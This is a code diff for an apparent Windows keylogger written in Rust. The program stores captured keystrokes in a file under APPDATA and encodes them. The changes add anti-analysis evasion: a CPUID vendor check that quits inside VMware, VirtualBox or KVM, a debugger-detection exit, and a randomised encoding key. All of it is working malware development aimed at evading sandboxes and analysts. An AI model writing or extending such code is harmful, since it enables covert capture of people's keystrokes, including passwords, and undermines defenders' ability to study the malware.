@@ -1,4 +1,5 @@
 
+use std::convert::identity;
 use std::fs::{self, OpenOptions};
 use std::process;
 use std::sync::Mutex;
@@ -8,6 +9,7 @@ use crate::encode::{self, Encode};
 use std::path::PathBuf;
 use rand::{rngs::StdRng, SeedableRng, Rng};
 use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
+use raw_cpuid::{cpuid, CpuId};
 
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
@@ -55,7 +57,7 @@ use windows::Win32::UI::Input::KeyboardAndMouse::{
 };
 
 // creates a global encoder
-static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new(52)));
+static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new( StdRng::from_os_rng().r#gen())));
 
 static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
     let appdata = std::env::var("APPDATA").expect("APPDATA not found");
@@ -240,15 +242,29 @@ pub fn delete_file(){
     };
 }
 
+// Checks for anti-analyis
+
+//anti debugging
 pub fn check_for_debugging(){
     unsafe{
 
         if IsDebuggerPresent().as_bool(){
-            print!("Fuck off");
             process::exit(1);
         }
-
-        print!("we good");
-
     };
+}
+
+//anti VM
+pub fn check_for_vm(){
+    let cpuid = CpuId::new();
+
+    if let Some(info) = cpuid.get_vendor_info(){
+
+        let v = info.as_str();
+
+       if v.contains("VMware") || v.contains("VBox") || v.contains("KVM") {
+            println!("Virtual CPU vendor detected: {}", v);
+            std::process::exit(1);
+        }
+    }
 }
